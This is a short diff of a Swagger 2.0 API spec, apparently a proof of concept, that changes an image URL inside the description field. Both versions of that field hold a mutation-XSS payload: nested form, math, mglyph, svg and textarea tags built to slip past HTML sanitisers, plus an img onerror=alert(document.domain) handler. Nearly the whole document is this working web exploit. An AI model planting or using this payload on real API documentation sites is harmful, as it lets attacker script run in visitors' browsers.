@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1><img src='https://raw.githubusercontent.com/Henry1601/PoC/main/moe_small.jpeg'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1><img src='https://raw.githubusercontent.com/maxntv24/Swagger_XSS/main/cat.png'>"></form>
 
   version: production
 basePath: /JSSResource/
